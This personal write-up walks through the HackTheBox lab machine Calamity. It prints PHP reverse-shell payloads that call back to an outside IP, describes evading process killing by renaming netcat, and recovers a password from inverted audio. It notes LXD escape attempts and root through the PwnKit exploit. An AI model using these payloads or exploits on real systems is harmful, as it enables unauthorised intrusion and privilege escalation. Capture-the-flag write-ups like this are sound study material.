---
title: "HackTheBox - Calamity (More Steganography!)"
categories:
  - Personal
  - posts
---
Calamity is another older HackTheBox machine that doesn't necessarily stand the test of time, as the intended binary exploitation privilege escalation is bypassed with PwnKit.

# User
Got a login to admin.php by view source and scrolling to the right

this works but the shell instantly dies

`<?php system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.2/443 0>&1'"); ?>`

By reading /home/xalvas/intrusions we can infer that nc, sh, and python processes are being killed, so we can just move the nc binary to /dev/shm and rename it.

`<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|/dev/shm/sneed 10.10.16.2 4444 >/tmp/f"); ?>`  works!

We exfiltrate the audio files, two of them are rickrolls, but don’t have the same md5 or audio waves

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/2798169a-52a4-43bc-94fb-500f8d9c50f0/04e17315-5e5e-44a6-9329-14201eb16550/image.png)

import both of them into audacity, go to effects, and invert.

`18547936..*`  works to ssh into xalvas!

# Root

We have the lxd group.

https://reboare.github.io/lxd/lxd-escape.html 

Tried this but it didn’t work, needed internet. Also tried the base64 workaround from 0xdfs tabby writeup but the i686 architecture wasn’t supported on this box.

`git clone https://github.com/saghul/lxd-alpine-builder`

`./build-alpine -a i686`

This builds a .tar.gz file of Alpine, so I transfer it over with nc.

After hours of searching, I literally could not  find or generate a i686 alpine file so I pwnkitted it but the general concept remains and LXD escapes are common through this method. I used this POC. https://github.com/arthepsy/CVE-2021-4034
